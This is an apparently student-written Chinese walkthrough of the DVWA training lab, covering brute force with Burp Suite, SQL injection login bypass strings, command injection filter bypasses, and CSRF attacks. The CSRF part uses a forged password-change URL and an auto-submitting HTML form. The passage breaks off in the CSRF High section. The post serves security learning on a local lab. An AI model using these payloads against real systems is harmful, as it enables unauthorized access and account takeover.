    <content type="html"><![CDATA[<h1 id="寒假任务-DVWA靶场通关"><a href="#寒假任务-DVWA靶场通关" class="headerlink" title="寒假任务 DVWA靶场通关"></a>寒假任务 DVWA靶场通关</h1><h2 id="一、Brute-Force"><a href="#一、Brute-Force" class="headerlink" title="一、Brute Force"></a>一、Brute Force</h2><h3 id="1-Low"><a href="#1-Low" class="headerlink" title="1.Low"></a>1.Low</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1."></a>方法1.</h4><p>进入靶场根据题目显然是让我们破解出密码因为安全等级最低因此我们首先想到的是进行暴力破解</p><p>方法：使用爆破工具burpsuit进行常规操作抓包使用密码本也可以同时对账号和密码进行爆破<strong>（注意：攻击类型选择Cluster bomb）如图：</strong></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-23%20141022.png" alt="屏幕截图 2024-01-23 141022"></p><p>爆破结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-22%20202853.png" alt="屏幕截图 2024-01-22 202853"></p><p>说明用户名和密码分别是：admin password</p><p>分别输入提交结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-22%20150532.png" alt="屏幕截图 2024-01-22 150532"></p><p><code>源码分析：</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">//先看看是否存在Login参数</span><br>    <br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-comment">//获取用户名并将其存放到变量$user中</span><br>    <br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-comment">//获取密码并将其存放在变量$pass中</span><br>    <br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-comment">//将储存在变量$pass中的密码使用md5加密</span><br>    <br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-comment">//构建SQL语句以users表为查询目标并使用user和password字段进行筛选</span><br>    <span class="hljs-comment">//注意：这段代码存在SQL注入的风险 因为它直接将变量插入到SQL查询字符串中</span><br>    <br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-comment">//使用mysqli扩展库进行SQl查询，（查在数据库中查变量$query内容）并将查询结果储存在变量$result中，如果查到了就保存用户具体信息没查到就返回false，$result为空</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> )== <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">//如果结果存在只有一条则说明条件成立</span><br>        <br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-comment">//查询的结果数据存储在键值对$row中</span><br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><span class="hljs-comment">//根据下面的两行代码可知此操作是获取登录成功的照片</span><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>        <span class="hljs-comment">//登录成功后分别输出 Welcome to the password protected area 和一张照片</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-comment">//这时登录失败的情况输出Username and/or password incorrect.</span><br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>    <span class="hljs-comment">//关闭MySQL数据库的连接（如果关闭失败会返回false）</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2."></a>方法2.</h4><p>通过源代码的分析我们可以发现以源代码存在SQL注入的风险因此我们可以通过对源代码的观察写出对应的SQL注入攻击的语句：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">admin<span class="hljs-symbol">&#x27;or</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> limit <span class="hljs-number">1</span> # <br></code></pre></td></tr></table></figure><p>其中’1’&#x3D;’1’表示条件始终为真limit 1表示只取SQL查询结果的第一行 #表示将后面的代码注释掉</p><p>或者</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>结合源代码可知因为and的优先级大于or所以or’1’&#x3D;’1’可以使整个判断语句为真但是必须要有or </p><p>‘or之前可以是任意值</p><h3 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>这个等级的源码只需要 sleep( 2 ) 即可这段代码表示每次登录失败后会延时2秒只不过需要更久的时间破解其他没有不同</p><p>一样使用burp进行暴力破解即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-19%20165646.png" alt="屏幕截图 2024-02-19 165646"></p><p>根据长度可知admin password为正确的账户和密码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-19%20170646.png" alt="屏幕截图 2024-02-19 170646"></p><h3 id="3-High"><a href="#3-High" class="headerlink" title="3.High"></a>3.High</h3><p>这一关与之前的区别主要在于token</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br></code></pre></td></tr></table></figure><p>Token是在客户端频繁向服务端请求数据服务端频繁的去数据库查询用户名和密码并进行对比判断用户名和密码正确与否并作出相应提示在这样的背景下Token便应运而生</p><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码</p><p><strong>注意：这是因为将一个随机产生的Token加入请求之后，每次请求Token都会改变</strong></p><p>接下来我们开始闯关，首先进行抓包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20154041.png" alt="屏幕截图 2024-02-20 154041"></p><p>在这里我们要爆破的内容是密码和token，选中然后再设置攻击模式</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20154806.png" alt="屏幕截图 2024-02-20 154806"></p><p>线程设置为一</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175601.png" alt="屏幕截图 2024-02-20 175601"></p><p>在grep-extract中点击add，选择refetch response点击ok</p><p>复制token的值 后面要用</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175053.png" alt="屏幕截图 2024-02-20 175053"></p><p>然后开始设置负载对于第一个参数就是密码我们采用字典爆破，导入字典</p><p>第二个参数是token如下图进行设置 在payload option中粘贴token的值<strong>注意：如果第一次爆破失败第二次要从新抓包在进行爆破因为token的值会改变</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175132.png" alt="屏幕截图 2024-02-20 175132"></p><p>部设置完成开始进行爆破找出不同数字即为最终结果</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175321.png" alt="屏幕截图 2024-02-20 175321"></p><p>由上图可知password为正确密码输入回车即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175344.png" alt="屏幕截图 2024-02-20 175344"></p><h3 id="4-Impossible"><a href="#4-Impossible" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>此题和上一题的区别为加上了用户锁定一旦登录超过3次用户就会被锁定15秒无法登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20212901.png" alt="屏幕截图 2024-02-20 212901"></p><p>所以我们无法在短时间里通过burp将拥护密码爆出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br></code></pre></td></tr></table></figure><p><strong>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入这里因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令</strong></p><h2 id="二、Command-Injection"><a href="#二、Command-Injection" class="headerlink" title="二、Command Injection"></a>二、Command Injection</h2><h3 id="1-Low-1"><a href="#1-Low-1" class="headerlink" title="1.Low"></a>1.Low</h3><p>输入127.0.0.1进行测试类似于ping命令 出现了乱码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220108.png" alt="屏幕截图 2024-02-20 220108"></p><p>找到DVWA中对应的文件 然后把编码形式进行修改，意思就是把utf-8改为gb2312</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220233.png" alt="屏幕截图 2024-02-20 220233"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220321.png" alt="屏幕截图 2024-02-20 220321"></p><p>保存退出如图：</p><p>![屏幕截图 2024-02-20 220108](C:\Users\35358\Pictures\Screenshots\屏幕截图 2024-02-20 220108.png)</p><p>然后试着查看网络配置信息</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220531.png" alt="屏幕截图 2024-02-20 220531"></p><p>查看系统信息</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20221202.png" alt="屏幕截图 2024-02-20 221202"></p><p>查看目录</p><p>如图：</p><p>![屏幕截图 2024-02-20 221513](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-02-20 221513.png)</p><p>ok 下一关</p><h3 id="2-Medium-1"><a href="#2-Medium-1" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>首先分析源代码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20222509.png" alt="屏幕截图 2024-02-20 222509"></p><p>会将我们传入的值中的&amp;&amp;和;替换成’ ‘在执行</p><p>但是不影响我们使用&amp;</p><p>注：</p><ul><li><code>&amp;</code> 是一个逻辑运算符，用于表示逻辑与（AND）操作。它用于将两个条件连接起来，只有当两个条件都为真时，整个表达式才为真。</li><li><code>&amp;&amp;</code> 也是一个逻辑运算符，用于表示逻辑与（AND）操作。与 <code>&amp;</code> 不同的是，<code>&amp;&amp;</code> 具有短路特性。这意味着如果第一个条件为假，那么第二个条件将不会被执行，因为整个表达式已经确定为假</li></ul><p>如图：</p><p>![屏幕截图 2024-02-20 222724](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-02-20 222724.png)</p><p>ok 下一关</p><h3 id="3-High-1"><a href="#3-High-1" class="headerlink" title="3.High"></a>3.High</h3><p>打开源代码看一下发现好多字符都被替换掉了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20223105.png" alt="屏幕截图 2024-02-20 223105"></p><p>嘿嘿嘿，仔细看就会发现它过滤的是’| ‘而不是’|’它的有空格所以我们依然可以使用没有空格的’|’来绕过</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20223844.png" alt="屏幕截图 2024-02-20 223844"></p><p>ok 下一关</p><h3 id="4-Impossible-1"><a href="#4-Impossible-1" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>接下来看一下 Impossible 的代码学习一下安全的过滤方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 检查是否提交了表单</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br><span class="hljs-comment">// 检查令牌</span><br><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><span class="hljs-comment">// 获取输入</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<br><br><span class="hljs-comment">// 将 IP 地址拆分为 4 个八位组</span><br><span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br><span class="hljs-comment">// 检查每个八位组是否为整数</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br><span class="hljs-comment">// 如果所有 4 个八位组都是整数，则重新组合 IP 地址</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br><span class="hljs-comment">// 确定操作系统并执行 ping 命令</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br><span class="hljs-comment">// Windows</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// *nix</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><br><span class="hljs-comment">// 反馈给最终用户</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 出错，告知用户存在错误的 IP 地址</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 生成令牌</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注：Token是首次登陆时由服务器下发作为客户端进行请求的一个令牌当交互时用于身份验证的一种验证机制当第一次登录后服务器生成一个Token便将此Token返回给客户端以后客户端只需带上这个Token前来请求数据即可无需再次带上用户名和密码</strong></p><h2 id="三、CSRF"><a href="#三、CSRF" class="headerlink" title="三、CSRF"></a>三、CSRF</h2><p>（建议看这一关之前先去看看xss那关）</p><p><strong>csrf跨站请求伪造：是一种对网站的恶意利用通过伪造来自受信任用户的请求来利用受信任的网站本质来说就是在你访问网站信息的同时盗用你的cookie用你的身份进行一些非法操作</strong></p><h3 id="1-Low-2"><a href="#1-Low-2" class="headerlink" title="1.Low"></a>1.Low</h3><p>进入这一关后可以知道它然我们修改密码然后我们进行修改并将其提交</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20225200.png" alt="屏幕截图 2024-02-20 225200"></p><p>由图片可知是Get传参</p><p>只需要攻击者让用户访问如下网址：</p><p><code>http://127.0.0.1/DVWA/digininja-DVWA-34a10d4/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#</code></p><p>受害者点击这个网址的话就会把密码修改为：111</p><p>当然一般谁会点这一大长串连接这是我们可以利用站长工具这样就可以将这个连接重定向到一个短链接中</p><p>就会生成这个短链接：<code>http://suo.im/5LkFdh</code></p><p>但是我们可以curl一下这个链接这样就可以重定向到原来的链接了</p><p>curl的更多用法详见：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html%E6%8C%BA%E8%AF%A6%E7%BB%86%E7%9A%84%E5%BB%BA%E8%AE%AE%E7%9C%8B%E4%B8%80%E4%B8%8B">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html挺详细的建议看一下</a></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20125954.png" alt="屏幕截图 2024-02-21 125954"></p><p>Location后面跟着的便是原来的链接</p><p>如图可以看到我们已经更改成功原密码已经失效</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20130130.png" alt="屏幕截图 2024-02-21 130130"></p><p>这便是跨网站请求了此网站受信任用户的身份进行了密码修改的操作</p><h3 id="2-Medium-2"><a href="#2-Medium-2" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>在此等级中增加了referer判断只有 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域才能进入修改密码的语句中</p><p>即：请求中的referer必须是服务器名<strong>意思是你这个请求必须来自他自己的页面不能是其他人提供的</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20131856.png" alt="屏幕截图 2024-02-21 131856"></p><p>图中我已经将原网站的referer改了提交后便显示请求不正确</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20134006.png" alt="屏幕截图 2024-02-21 134006"></p><p>在实战中如果我们想通过别人点击我们所发送的链接来更改的话我们的域名肯定和原网站服务器的域名不一样这就需要我们去进行更改</p><p>当然受害者肯定不会帮我们手动添加 referer 的，因为代码使用了 <code>stripos</code> 函数来检测 referer，所以这个时候我们得自己构造好一个 html 页面表单：Html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;222&quot;</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;222&quot;</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;csrf&quot;</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该表单通过Javascript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;csrf&quot;</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实现自动触发提交 id 为 csrf 的表单</p><p>自动提交完成后密码便完成了修改我们的目的也就达成了</p><h3 id="3-High-2"><a href="#3-High-2" class="headerlink" title="3.High"></a>3.High</h3><p>在这一关，我们输入相关内容是发现地址带入了token，这个时候我们需要借助上一关的存储型xss来爆出token</p><p>我们首先进入存储型xss High级别</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114342.png" alt="屏幕截图 2024-02-23 114342"></p><p><img 